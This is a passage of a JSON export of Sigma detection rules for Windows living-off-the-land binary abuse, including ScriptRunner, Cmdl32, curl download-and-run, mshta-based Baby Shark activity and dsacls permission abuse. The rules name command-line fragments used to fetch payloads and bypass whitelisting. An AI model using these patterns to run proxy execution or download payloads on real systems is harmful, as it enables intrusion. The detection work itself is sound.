                    "f37aba28-a9e6-4045-882c-d5004043b337",
                    "7cce6fc8-a07f-4d84-a53e-96e1879843c9",
                    "f0540f7e-2db3-4432-b9e0-3965486744bc",
                    "21dd6d38-2b18-4453-9404-a0fe4a0cc288",
                    "cd71385d-fd9b-4691-9b98-2b1f7e508714",
                    "fa4b21c9-0057-4493-b289-2556416ae4d7",
                    "419dbf2b-8a9b-4bea-bf99-7544b050ec8d",
                    "2b30fa36-3a18-402f-a22d-bf4ce2189f35",
                    "9f2cc74d-78af-4eb2-bb64-9cd1d292b87b",
                    "01c42d3c-242d-4655-85b2-34f1739632f7",
                    "634b00d5-ccc3-4a06-ae3b-0ec8444dd51b",
                    "1c8774a0-44d4-4db0-91f8-e792359c70bd",
                    "90d50722-0483-4065-8e35-57efaadd354d",
                    "cfed2f44-16df-4bf3-833a-79405198b277",
                    "654fcc6d-840d-4844-9b07-2c3300e54a26",
                    "f65e22f9-819e-4f96-9c7b-498364ae7a25",
                    "2267fe65-0681-42ad-9a6d-46553d3f3480",
                    "f24bcaea-0cd1-11eb-adc1-0242ac120002",
                    "fde7929d-8beb-4a4c-b922-be9974671667",
                    "a85ffc3a-e8fd-4040-93bf-78aff284d801",
                    "7a74da6b-ea76-47db-92cc-874ad90df734",
                    "8e0bb260-d4b2-4fff-bb8d-3f82118e6892",
                    "65d2be45-8600-4042-b4c0-577a1ff8a60e",
                    "fb0b815b-f5f6-4f50-970f-ffe21f253f7a",
                    "38a7625e-b2cb-485d-b83d-aff137d859f4",
                    "bf6c39fc-e203-45b9-9538-05397c1b4f3f",
                    "3a6586ad-127a-4d3b-a677-1e6eacdf8fde",
                    "9c8c7000-3065-44a8-a555-79bcba5d9955",
                    "75edd216-1939-4c73-8d61-7f3a0d85b5cc",
                    "729ce0ea-5d8f-4769-9762-e35de441586d",
                    "e0b06658-7d1d-4cd3-bf15-03467507ff7c",
                    "242301bc-f92f-4476-8718-78004a6efd9f",
                    "7efd2c8d-8b18-45b7-947d-adfe9ed04f61",
                    "9cfc00b6-bfb7-49ce-9781-ef78503154bb",
                    "46123129-1024-423e-9fae-43af4a0fa9a5",
                    "5594e67a-7f92-4a04-b65d-1a42fd824a60",
                    "6e968eb1-5f05-4dac-94e9-fd0c5cb49fd6",
                    "b9b6dcfa-0b11-40dc-9bf4-9a36a2c1a046",
                    "457c7820-d331-465a-915e-42f85500ccc4",
                    "b8b1b304-a60f-4999-9a6e-c547bde03ffd",
                    "dec44ca7-61ad-493c-bfd7-8819c5faa09b",
                    "fc014922-5def-4da9-a0fc-28c973f41bfb",
                    "727454c0-d851-48b0-8b89-385611ab0704",
                    "15c7904e-6ad1-4a45-9b46-5fb25df37fd2",
                    "6c6d9280-e6d0-4b9d-80ac-254701b64916",
                    "9eb271b9-24ae-4cd4-9465-19cfc1047f3e",
                    "9f107a84-532c-41af-b005-8d12a607639f",
                    "c649a6c7-cd8c-4a78-9c04-000fc76df954",
                    "b97cd4b1-30b8-4a9d-bd72-6293928d52bc",
                    "b2309017-4235-44fe-b5af-b15363011957",
                    "af77cf95-c469-471c-b6a0-946c685c4798",
                    "fbd7c32d-db2a-4418-b92c-566eb8911133",
                    "56cb2bd3-5525-46bd-a454-ea895a5b4d0d",
                    "82a19e3a-2bfe-4a91-8c0d-5d4c98fbb719",
                    "b124ddf4-778d-418e-907f-6dd3fc0d31cd",
                    "0bbc6369-43e3-453d-9944-cae58821c173",
                    "459f2f98-397b-4a4a-9f47-6a5ec2f1c69d",
                    "52cad028-0ff0-4854-8f67-d25dfcbc78b4",
                    "28c8f68b-098d-45af-8d43-8089f3e35403",
                    "90dcf730-1b71-4ae7-9ffc-6fcf62bd0132",
                    "cec8e918-30f7-4e2d-9bfa-a59cc97ae60f",
                    "f3d39c45-de1a-4486-a687-ab126124f744",
                    "ce7cf472-6fcc-490a-9481-3786840b5d9b",
                    "643bdcac-8b82-49f4-9fd9-25a90b929f3b",
                    "0c2f8629-7129-4a8a-9897-7e0768f13ff2",
                    "9c7e131a-0f2c-4ae0-9d43-b04f4e266d43",
                    "d06be4b9-8045-428b-a567-740a26d9db25",
                    "60f16a96-db70-42eb-8f76-16763e333590",
                    "5a3164f2-b373-4152-93cf-090b13c12d27",
                    "36475a7d-0f6d-4dce-9b01-6aeb473bbaf1",
                    "827e941e-4a99-4e2c-a578-bfcec2d40552",
                    "104cdb48-a7a8-4ca7-a453-32942c6e5dcb",
                    "cc268ac1-42d9-40fd-9ed3-8c4e1a5b87e6",
                    "6004abd0-afa4-4557-ba90-49d172e0a299",
                    "409f8a98-4496-4aaa-818a-c931c0a8b832",
                    "bac9fb54-2da7-44e9-988f-11e9a5edbc0c",
                    "6f535e01-ca1f-40be-ab8d-45b19c0c8b7f",
                    "40b95d31-1afc-469e-8d34-9a3a667d058e",
                    "fe5ce7eb-dad8-467c-84a9-31ec23bd644a",
                    "1e59c230-6670-45bf-83b0-98903780607e",
                    "0fa66f66-e3f6-4a9c-93f8-4f2610b00171",
                    "b30a8bc5-e21b-4ca2-9420-0a94019ac56a",
                    "cd3d1298-eb3b-476c-ac67-12847de55813",
                    "646bc99f-6682-4b47-a73a-17b1b64c9d34",
                    "aaf46cdc-934e-4284-b329-34aa701e3771",
                    "d3bf399f-b0cf-4250-8bb4-dfc192ab81dc",
                    "e76c8240-d68f-4773-8880-5c6f63595aaf",
                    "961e0abb-1b1e-4c84-a453-aafe56ad0d34",
                    "a6fc3c46-23b8-4996-9ea2-573f4c4d88c5",
                    "3b3c7f55-f771-4dd6-8a6e-08d057a17caf",
                    "1dd05363-104e-4b4a-b963-196a534b03a1",
                    "53d4bb30-3f36-4e8a-b078-69d36c4a79ff",
                    "d80d5c81-04ba-45b4-84e4-92eba40e0ad3",
                    "81ebd28b-9607-4478-bf06-974ed9d53ed7",
                    "d22e2925-cfd8-463f-96f6-89cec9d9bc5f",
                    "b5c7395f-e501-4a08-94d4-57fe7a9da9d2",
                    "dddfebae-c46f-439c-af7a-fdb6bde90218",
                    "c0b40568-b1e9-4b03-8d6c-b096da6da9ab",
                    "835e75bf-4bfd-47a4-b8a6-b766cac8bcb7",
                    "7d604714-e071-49ff-8726-edeb95a70679",
                    "17eb8e57-9983-420d-ad8a-2c4976c22eb8",
                    "43103702-5886-11ed-9b6a-0242ac120002",
                    "d7825193-b70a-48a4-b992-8b5b3015cc11",
                    "9577edbb-851f-4243-8c91-1d5b50c1a39b",
                    "a20391f8-76fb-437b-abc0-dba2df1952c6",
                    "0b4ae027-2a2d-4b93-8c7e-962caaba5b2a",
                    "340a090b-c4e9-412e-bb36-b4b16fe96f9b",
                    "bafac3d6-7de9-4dd9-8874-4a1194b493ed",
                    "9386d78a-7207-4048-9c9f-a93a7c2d1c05",
                    "56a8189f-11b2-48c8-8ca7-c54b03c2fbf7"
                ],
                "lookup_results": [
                    {
                        "uuid": "64760eef-87f7-4ed3-93fd-655668ea9420",
                        "lookup_data": {
                            "description": "The \"ScriptRunner.exe\" binary can be abused to proxy execution through it and bypass possible whitelisting",
                            "raw": "author: Nasreddine Bencherchali (Nextron Systems)\ndate: 2022/07/01\ndescription: The \"ScriptRunner.exe\" binary can be abused to proxy execution through\n  it and bypass possible whitelisting\ndetection:\n  condition: all of selection*\n  selection_cli:\n    CommandLine|contains: ' -appvscript '\n  selection_img:\n  - Image|endswith: \\ScriptRunner.exe\n  - OriginalFileName: ScriptRunner.exe\nfalsepositives:\n- Legitimate use when App-v is deployed\nid: 64760eef-87f7-4ed3-93fd-655668ea9420\nlevel: medium\nlogsource:\n  category: process_creation\n  product: windows\nreferences:\n- https://lolbas-project.github.io/lolbas/Binaries/Scriptrunner/\nstatus: experimental\ntags:\n- attack.defense_evasion\n- attack.execution\n- attack.t1218\ntitle: Use of Scriptrunner.exe\n",
                            "sigma:id": "64760eef-87f7-4ed3-93fd-655668ea9420",
                            "title": "Use of Scriptrunner.exe",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "02b18447-ea83-4b1b-8805-714a8a34546a",
                        "lookup_data": {
                            "description": "Use OfflineScannerShell.exe to execute mpclient.dll library in the current working directory",
                            "raw": "author: frack113\ndate: 2022/03/06\ndescription: Use OfflineScannerShell.exe to execute mpclient.dll library in the current\n  working directory\ndetection:\n  condition: lolbas and not 1 of filter_*\n  filter_correct:\n    CurrentDirectory: C:\\Program Files\\Windows Defender\\Offline\\\n  filter_missing:\n    CurrentDirectory: null\n  lolbas:\n    Image|endswith: \\OfflineScannerShell.exe\nfalsepositives:\n- Unknown\nid: 02b18447-ea83-4b1b-8805-714a8a34546a\nlevel: medium\nlogsource:\n  category: process_creation\n  product: windows\nreferences:\n- https://lolbas-project.github.io/lolbas/Binaries/OfflineScannerShell/\nstatus: test\ntags:\n- attack.defense_evasion\n- attack.t1218\ntitle: Suspicious OfflineScannerShell.exe Execution From Another Folder\n",
                            "sigma:id": "02b18447-ea83-4b1b-8805-714a8a34546a",
                            "title": "Suspicious OfflineScannerShell.exe Execution From Another Folder",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "f37aba28-a9e6-4045-882c-d5004043b337",
                        "lookup_data": {
                            "description": "lolbas Cmdl32 is use to download a payload to evade antivirus",
                            "raw": "author: frack113\ndate: 2021/11/03\ndescription: lolbas Cmdl32 is use to download a payload to evade antivirus\ndetection:\n  condition: all of selection*\n  selection_cli:\n    CommandLine|contains|all:\n    - '/vpn '\n    - '/lan '\n  selection_img:\n  - Image|endswith: \\cmdl32.exe\n  - OriginalFileName: CMDL32.EXE\nfalsepositives:\n- Unknown\nid: f37aba28-a9e6-4045-882c-d5004043b337\nlevel: medium\nlogsource:\n  category: process_creation\n  product: windows\nmodified: 2022/06/12\nreferences:\n- https://lolbas-project.github.io/lolbas/Binaries/Cmdl32/\n- https://twitter.com/SwiftOnSecurity/status/1455897435063074824\nstatus: experimental\ntags:\n- attack.execution\n- attack.defense_evasion\n- attack.t1218\n- attack.t1202\ntitle: Suspicious Cmdl32 Execution\n",
                            "sigma:id": "f37aba28-a9e6-4045-882c-d5004043b337",
                            "title": "Suspicious Cmdl32 Execution",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "7cce6fc8-a07f-4d84-a53e-96e1879843c9",
                        "lookup_data": {
                            "description": "Detects binaries that use the same name as legitimate sysinternals tools to evade detection",
                            "raw": "author: frack113\ndate: 2021/12/20\ndescription: Detects binaries that use the same name as legitimate sysinternals tools\n  to evade detection\ndetection:\n  condition: selection_exe and not 1 of filter*\n  filter_empty:\n    Company: null\n  filter_valid:\n    Company:\n    - Sysinternals - www.sysinternals.com\n    - Sysinternals\n  selection_exe:\n    Image|endswith:\n    - \\accesschk.exe\n    - \\accesschk64.exe\n    - \\AccessEnum.exe\n    - \\ADExplorer.exe\n    - \\ADExplorer64.exe\n    - \\ADInsight.exe\n    - \\ADInsight64.exe\n    - \\adrestore.exe\n    - \\adrestore64.exe\n    - \\Autologon.exe\n    - \\Autologon64.exe\n    - \\Autoruns.exe\n    - \\Autoruns64.exe\n    - \\autorunsc.exe\n    - \\autorunsc64.exe\n    - \\Bginfo.exe\n    - \\Bginfo64.exe\n    - \\Cacheset.exe\n    - \\Cacheset64.exe\n    - \\Clockres.exe\n    - \\Clockres64.exe\n    - \\Contig.exe\n    - \\Contig64.exe\n    - \\Coreinfo.exe\n    - \\Coreinfo64.exe\n    - \\CPUSTRES.EXE\n    - \\CPUSTRES64.EXE\n    - \\ctrl2cap.exe\n    - \\Dbgview.exe\n    - \\dbgview64.exe\n    - \\Desktops.exe\n    - \\Desktops64.exe\n    - \\disk2vhd.exe\n    - \\disk2vhd64.exe\n    - \\diskext.exe\n    - \\diskext64.exe\n    - \\Diskmon.exe\n    - \\Diskmon64.exe\n    - \\DiskView.exe\n    - \\DiskView64.exe\n    - \\du.exe\n    - \\du64.exe\n    - \\efsdump.exe\n    - \\FindLinks.exe\n    - \\FindLinks64.exe\n    - \\handle.exe\n    - \\handle64.exe\n    - \\hex2dec.exe\n    - \\hex2dec64.exe\n    - \\junction.exe\n    - \\junction64.exe\n    - \\ldmdump.exe\n    - \\listdlls.exe\n    - \\listdlls64.exe\n    - \\livekd.exe\n    - \\livekd64.exe\n    - \\loadOrd.exe\n    - \\loadOrd64.exe\n    - \\loadOrdC.exe\n    - \\loadOrdC64.exe\n    - \\logonsessions.exe\n    - \\logonsessions64.exe\n    - \\movefile.exe\n    - \\movefile64.exe\n    - \\notmyfault.exe\n    - \\notmyfault64.exe\n    - \\notmyfaultc.exe\n    - \\notmyfaultc64.exe\n    - \\ntfsinfo.exe\n    - \\ntfsinfo64.exe\n    - \\pendmoves.exe\n    - \\pendmoves64.exe\n    - \\pipelist.exe\n    - \\pipelist64.exe\n    - \\portmon.exe\n    - \\procdump.exe\n    - \\procdump64.exe\n    - \\procexp.exe\n    - \\procexp64.exe\n    - \\Procmon.exe\n    - \\Procmon64.exe\n    - \\psExec.exe\n    - \\psExec64.exe\n    - \\psfile.exe\n    - \\psfile64.exe\n    - \\psGetsid.exe\n    - \\psGetsid64.exe\n    - \\psInfo.exe\n    - \\psInfo64.exe\n    - \\pskill.exe\n    - \\pskill64.exe\n    - \\pslist.exe\n    - \\pslist64.exe\n    - \\psLoggedon.exe\n    - \\psLoggedon64.exe\n    - \\psloglist.exe\n    - \\psloglist64.exe\n    - \\pspasswd.exe\n    - \\pspasswd64.exe\n    - \\psping.exe\n    - \\psping64.exe\n    - \\psService.exe\n    - \\psService64.exe\n    - \\psshutdown.exe\n    - \\psshutdown64.exe\n    - \\pssuspend.exe\n    - \\pssuspend64.exe\n    - \\RAMMap.exe\n    - \\RDCMan.exe\n    - \\RegDelNull.exe\n    - \\RegDelNull64.exe\n    - \\regjump.exe\n    - \\ru.exe\n    - \\ru64.exe\n    - \\sdelete.exe\n    - \\sdelete64.exe\n    - \\ShareEnum.exe\n    - \\ShareEnum64.exe\n    - \\shellRunas.exe\n    - \\sigcheck.exe\n    - \\sigcheck64.exe\n    - \\streams.exe\n    - \\streams64.exe\n    - \\strings.exe\n    - \\strings64.exe\n    - \\sync.exe\n    - \\sync64.exe\n    - \\Sysmon.exe\n    - \\Sysmon64.exe\n    - \\tcpvcon.exe\n    - \\tcpvcon64.exe\n    - \\tcpview.exe\n    - \\tcpview64.exe\n    - \\Testlimit.exe\n    - \\Testlimit64.exe\n    - \\vmmap.exe\n    - \\vmmap64.exe\n    - \\Volumeid.exe\n    - \\Volumeid64.exe\n    - \\whois.exe\n    - \\whois64.exe\n    - \\Winobj.exe\n    - \\Winobj64.exe\n    - \\ZoomIt.exe\n    - \\ZoomIt64.exe\nfalsepositives:\n- Unknown\nid: 7cce6fc8-a07f-4d84-a53e-96e1879843c9\nlevel: medium\nlogsource:\n  category: process_creation\n  product: windows\nmodified: 2022/12/08\nreferences:\n- https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite\nstatus: experimental\ntags:\n- attack.execution\n- attack.defense_evasion\n- attack.t1218\n- attack.t1202\ntitle: Potential Binary Impersonating Sysinternals Tools\n",
                            "sigma:id": "7cce6fc8-a07f-4d84-a53e-96e1879843c9",
                            "title": "Potential Binary Impersonating Sysinternals Tools",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "f0540f7e-2db3-4432-b9e0-3965486744bc",
                        "lookup_data": {
                            "description": "Detects programs on a Windows system that should not write executables to disk",
                            "raw": "author: frack113, Florian Roth\ndate: 2022/08/21\ndescription: Detects programs on a Windows system that should not write executables\n  to disk\ndetection:\n  condition: selection\n  selection:\n    Image|endswith:\n    - \\winword.exe\n    - \\excel.exe\n    - \\powerpnt.exe\n    - \\msaccess.exe\n    - \\mspub.exe\n    - \\eqnedt32.exe\n    - \\visio.exe\n    - \\wordpad.exe\n    - \\wordview.exe\n    - \\certutil.exe\n    - \\certoc.exe\n    - \\CertReq.exe\n    - \\Desktopimgdownldr.exe\n    - \\esentutl.exe\n    - \\finger.exe\n    - \\notepad.exe\n    - \\AcroRd32.exe\n    - \\RdrCEF.exe\n    - \\mshta.exe\n    - \\hh.exe\n    TargetFilename|endswith:\n    - .exe\n    - .dll\n    - .ocx\nfalsepositives:\n- Unknown\nid: f0540f7e-2db3-4432-b9e0-3965486744bc\nlevel: high\nlogsource:\n  category: file_event\n  product: windows\nreferences:\n- https://github.com/Neo23x0/sysmon-config/blob/3f808d9c022c507aae21a9346afba4a59dd533b9/sysmonconfig-export-block.xml#L1326\nstatus: experimental\ntags:\n- attack.defense_evasion\n- attack.t1218\ntitle: Legitimate Application Dropped Executable\n",
                            "sigma:id": "f0540f7e-2db3-4432-b9e0-3965486744bc",
                            "title": "Legitimate Application Dropped Executable",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "21dd6d38-2b18-4453-9404-a0fe4a0cc288",
                        "lookup_data": {
                            "description": "Adversaries can use curl to download payloads remotely and execute them. Curl is included by default in Windows 10 build 17063 and later.",
                            "raw": "author: Sreeman, Nasreddine Bencherchali\ndate: 2020/01/13\ndescription: Adversaries can use curl to download payloads remotely and execute them.\n  Curl is included by default in Windows 10 build 17063 and later.\ndetection:\n  condition: selection\n  selection:\n    CommandLine|contains|all:\n    - ' /c '\n    - 'curl '\n    - http\n    - -o\n    - '&'\nfalsepositives:\n- Administrative scripts (installers)\nfields:\n- ParentImage\n- CommandLine\nid: 21dd6d38-2b18-4453-9404-a0fe4a0cc288\nlevel: high\nlogsource:\n  category: process_creation\n  product: windows\nmodified: 2022/08/02\nreferences:\n- https://medium.com/@reegun/curl-exe-is-the-new-rundll32-exe-lolbin-3f79c5f35983\nstatus: test\ntags:\n- attack.execution\n- attack.t1218\n- attack.command_and_control\n- attack.t1105\ntitle: Curl Start Combination\n",
                            "sigma:id": "21dd6d38-2b18-4453-9404-a0fe4a0cc288",
                            "title": "Curl Start Combination",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "cd71385d-fd9b-4691-9b98-2b1f7e508714",
                        "lookup_data": {
                            "description": "Detect usage of the \"runexehelper.exe\" binary as a proxy to launch other programs",
                            "raw": "author: frack113\ndate: 2022/12/29\ndescription: Detect usage of the \"runexehelper.exe\" binary as a proxy to launch other\n  programs\ndetection:\n  condition: selection\n  selection:\n    ParentImage|endswith: \\runexehelper.exe\nfalsepositives:\n- Unknown\nid: cd71385d-fd9b-4691-9b98-2b1f7e508714\nlevel: medium\nlogsource:\n  category: process_creation\n  product: windows\nreferences:\n- https://twitter.com/0gtweet/status/1206692239839289344\n- https://lolbas-project.github.io/lolbas/Binaries/Runexehelper/\nstatus: experimental\ntags:\n- attack.defense_evasion\n- attack.t1218\ntitle: Lolbin Runexehelper Use As Proxy\n",
                            "sigma:id": "cd71385d-fd9b-4691-9b98-2b1f7e508714",
                            "title": "Lolbin Runexehelper Use As Proxy",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "fa4b21c9-0057-4493-b289-2556416ae4d7",
                        "lookup_data": {
                            "description": "Detects Possible Squirrel Packages Manager as Lolbin",
                            "raw": "author: Karneades / Markus Neis, Jonhnathan Ribeiro, oscd.community\ndate: 2019/11/12\ndescription: Detects Possible Squirrel Packages Manager as Lolbin\ndetection:\n  condition: all of selection* and not 1 of filter_*\n  filter_discord:\n    CommandLine|contains|all:\n    - C:\\Users\\\n    - \\AppData\\Local\\Discord\\Update.exe\n    - ' --processStart'\n    - Discord.exe\n  filter_github_desktop:\n    CommandLine|contains:\n    - --createShortcut\n    - --processStartAndWait\n    CommandLine|contains|all:\n    - C:\\Users\\\n    - \\AppData\\Local\\GitHubDesktop\\Update.exe\n    - GitHubDesktop.exe\n  filter_teams:\n    CommandLine|contains:\n    - --processStart\n    - --createShortcut\n    CommandLine|contains|all:\n    - C:\\Users\\\n    - \\AppData\\Local\\Microsoft\\Teams\\Update.exe\n    - Teams.exe\n  selection1:\n    CommandLine|contains: .exe\n    Image|endswith: \\update.exe\n  selection2:\n    CommandLine|contains:\n    - --processStart\n    - --processStartAndWait\n    - --createShortcut\nfalsepositives:\n- 1Clipboard\n- Beaker Browser\n- Caret\n- Collectie\n- Discord\n- Figma\n- Flow\n- Ghost\n- GitHub Desktop\n- GitKraken\n- Hyper\n- Insomnia\n- JIBO\n- Kap\n- Kitematic\n- Now Desktop\n- Postman\n- PostmanCanary\n- Rambox\n- Simplenote\n- Skype\n- Slack\n- SourceTree\n- Stride\n- Svgsus\n- WebTorrent\n- WhatsApp\n- WordPress.com\n- Atom\n- Gitkraken\n- Slack\n- Teams\nid: fa4b21c9-0057-4493-b289-2556416ae4d7\nlevel: medium\nlogsource:\n  category: process_creation\n  product: windows\nmodified: 2022/10/25\nreferences:\n- http://www.hexacorn.com/blog/2019/03/30/sqirrel-packages-manager-as-a-lolbin-a-k-a-many-electron-apps-are-lolbins-by-default/\n- http://www.hexacorn.com/blog/2018/08/16/squirrel-as-a-lolbin/\nstatus: experimental\ntags:\n- attack.execution\n- attack.defense_evasion\n- attack.t1218\ntitle: Squirrel Lolbin\n",
                            "sigma:id": "fa4b21c9-0057-4493-b289-2556416ae4d7",
                            "title": "Squirrel Lolbin",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "419dbf2b-8a9b-4bea-bf99-7544b050ec8d",
                        "lookup_data": {
                            "description": "Detects invocation of Microsoft Workflow Compiler, which may permit the execution of arbitrary unsigned code.",
                            "raw": "author: Nik Seetharaman, frack113\ndate: 2019/01/16\ndescription: Detects invocation of Microsoft Workflow Compiler, which may permit the\n  execution of arbitrary unsigned code.\ndetection:\n  condition: selection or selection_t1218\n  selection:\n    Image|endswith: \\Microsoft.Workflow.Compiler.exe\n  selection_t1218:\n    CommandLine|contains: .xml\n    OriginalFileName: Microsoft.Workflow.Compiler.exe\nfalsepositives:\n- Legitimate MWC use (unlikely in modern enterprise environments)\nfields:\n- CommandLine\n- ParentCommandLine\nid: 419dbf2b-8a9b-4bea-bf99-7544b050ec8d\nlevel: high\nlogsource:\n  category: process_creation\n  product: windows\nmodified: 2022/10/09\nreferences:\n- https://posts.specterops.io/arbitrary-unsigned-code-execution-vector-in-microsoft-workflow-compiler-exe-3d9294bc5efb\n- https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1218/T1218.md\nstatus: test\ntags:\n- attack.defense_evasion\n- attack.execution\n- attack.t1127\n- attack.t1218\ntitle: Microsoft Workflow Compiler\n",
                            "sigma:id": "419dbf2b-8a9b-4bea-bf99-7544b050ec8d",
                            "title": "Microsoft Workflow Compiler",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "2b30fa36-3a18-402f-a22d-bf4ce2189f35",
                        "lookup_data": {
                            "description": "Detects activity that could be related to Baby Shark malware",
                            "raw": "author: Florian Roth (Nextron Systems)\ndate: 2019/02/24\ndescription: Detects activity that could be related to Baby Shark malware\ndetection:\n  condition: selection\n  selection:\n    CommandLine|contains:\n    - reg query \"HKEY_CURRENT_USER\\Software\\Microsoft\\Terminal Server Client\\Default\"\n    - powershell.exe mshta.exe http\n    - cmd.exe /c taskkill /im cmd.exe\nfalsepositives:\n- Unknown\nid: 2b30fa36-3a18-402f-a22d-bf4ce2189f35\nlevel: high\nlogsource:\n  category: process_creation\n  product: windows\nmodified: 2022/11/11\nreferences:\n- https://unit42.paloaltonetworks.com/new-babyshark-malware-targets-u-s-national-security-think-tanks/\nstatus: test\ntags:\n- attack.execution\n- attack.t1059.003\n- attack.t1059.001\n- attack.discovery\n- attack.t1012\n- attack.defense_evasion\n- attack.t1218.005\ntitle: Baby Shark Activity\n",
                            "sigma:id": "2b30fa36-3a18-402f-a22d-bf4ce2189f35",
                            "title": "Baby Shark Activity",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "9f2cc74d-78af-4eb2-bb64-9cd1d292b87b",
                        "lookup_data": {
                            "description": "Detects suspicious connections from Microsoft Sync Center to non-private IPs.",
                            "raw": "author: elhoim\ndate: 2022/04/28\ndescription: Detects suspicious connections from Microsoft Sync Center to non-private\n  IPs.\ndetection:\n  condition: selection_mobsync and not filter\n  filter:\n    DestinationIp|startswith:\n    - '10.'\n    - 192.168.\n    - 172.16.\n    - 172.17.\n    - 172.18.\n    - 172.19.\n    - 172.20.\n    - 172.21.\n    - 172.22.\n    - 172.23.\n    - 172.24.\n    - 172.25.\n    - 172.26.\n    - 172.27.\n    - 172.28.\n    - 172.29.\n    - 172.30.\n    - 172.31.\n    DestinationIsIpv6: 'false'\n  selection_mobsync:\n    Image|endswith: \\mobsync.exe\nfalsepositives:\n- Unknown\nid: 9f2cc74d-78af-4eb2-bb64-9cd1d292b87b\nlevel: medium\nlogsource:\n  category: network_connection\n  product: windows\nmodified: 2022/06/02\nreferences:\n- https://redcanary.com/blog/intelligence-insights-november-2021/\nstatus: experimental\ntags:\n- attack.t1055\n- attack.t1218\n- attack.execution\n- attack.defense_evasion\ntitle: Microsoft Sync Center Suspicious Network Connections\n",
                            "sigma:id": "9f2cc74d-78af-4eb2-bb64-9cd1d292b87b",
                            "title": "Microsoft Sync Center Suspicious Network Connections",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "01c42d3c-242d-4655-85b2-34f1739632f7",
                        "lookup_data": {
                            "description": "Detects usage of Dsacls to grant over permissive permissions",
                            "raw": "author: Nasreddine Bencherchali (Nextron Systems)\ndate: 2022/06/20\ndescription: Detects usage of Dsacls to grant over permissive permissions\ndetection:\n  condition: all of selection*\n  selection_flag:\n    CommandLine|contains: ' /G '\n  selection_img:\n  - Image|endswith: \\dsacls.exe\n  - OriginalFileName: DSACLS.EXE\n  selection_permissions:\n    CommandLine|contains:\n    - GR\n    - GE\n    - GW\n    - GA\n    - WP\n    - WD\nfalsepositives:\n- Legitimate administrators granting over permissive permissions to users\nid: 01c42d3c-242d-4655-85b2-34f1739632f7\nlevel: medium\nlogsource:\n  category: process_creation\n  product: windows\nreferences:\n- https://ss64.com/nt/dsacls.html\n- https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc771151(v=ws.11)\nstatus: experimental\ntags:\n- attack.execution\n- attack.t1218\ntitle: Abusing Permissions Using Dsacls\n",
                            "sigma:id": "01c42d3c-242d-4655-85b2-34f1739632f7",
                            "title": "Abusing Permissions Using Dsacls",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "634b00d5-ccc3-4a06-ae3b-0ec8444dd51b",
                        "lookup_data": {
                            "description": "Windows Test Authoring and Execution Framework (TAEF) framework allows you to run automation by executing tests files written on different languages (C, C#, Microsoft COM Scripting interfaces\nAdversaries may execute malicious code (such as WSC file with VBScript, dll and so on) directly by running te.exe\n",
                            "raw": "author: Agro (@agro_sev) oscd.community\ndate: 2020/10/13\ndescription: 'Windows Test Authoring and Execution Framework (TAEF) framework allows\n  you to run automation by executing tests files written on different languages (C,\n  C#, Microsoft COM Scripting interfaces\n\n  Adversaries may execute malicious code (such as WSC file with VBScript, dll and\n  so on) directly by running te.exe\n\n  '\ndetection:\n  condition: selection\n  selection:\n  - Image|endswith: \\te.exe\n  - ParentImage|endswith: \\te.exe\n  - OriginalFileName: \\te.exe\nfalsepositives:\n- It's not an uncommon to use te.exe directly to execute legal TAEF tests\nid: 634b00d5-ccc3-4a06-ae3b-0ec8444dd51b\nlevel: low\nlogsource:\n  category: process_creation\n  product: windows\nmodified: 2021/11/27\nreferences:\n- https://lolbas-project.github.io/lolbas/OtherMSBinaries/Te/\n- https://twitter.com/pabraeken/status/993298228840992768\n- https://docs.microsoft.com/en-us/windows-hardware/drivers/taef/\nstatus: test\ntags:\n- attack.t1218\ntitle: Malicious Windows Script Components File Execution by TAEF Detection\n",
                            "sigma:id": "634b00d5-ccc3-4a06-ae3b-0ec8444dd51b",
                            "title": "Malicious Windows Script Components File Execution by TAEF Detection",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "1c8774a0-44d4-4db0-91f8-e792359c70bd",
                        "lookup_data": {
                            "description": "Detects the use of a Microsoft signed script 'REGISTER_APP.VBS' to register a VSS/VDS Provider as a COM+ application.",
                            "raw": "author: Nasreddine Bencherchali (Nextron Systems)\ndate: 2022/08/19\ndescription: Detects the use of a Microsoft signed script 'REGISTER_APP.VBS' to register\n  a VSS/VDS Provider as a COM+ application.\ndetection:\n  condition: selection\n  selection:\n    CommandLine|contains|all:\n    - \\register_app.vbs\n    - -register\nfalsepositives:\n- Legitimate usage of the script. Always investigate what's being registered to confirm\n  if it's benign\nid: 1c8774a0-44d4-4db0-91f8-e792359c70bd\nlevel: medium\nlogsource:\n  category: process_creation\n  product: windows\nreferences:\n- https://twitter.com/sblmsrsn/status/1456613494783160325?s=20\nstatus: experimental\ntags:\n- attack.defense_evasion\n- attack.t1218\ntitle: REGISTER_APP.VBS Proxy Execution\n",
                            "sigma:id": "1c8774a0-44d4-4db0-91f8-e792359c70bd",
                            "title": "REGISTER_APP.VBS Proxy Execution",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "90d50722-0483-4065-8e35-57efaadd354d",
                        "lookup_data": {
                            "description": "Detects a certain command line flag combination used by devinit.exe lolbin to download arbitrary MSI packages on a Windows system",
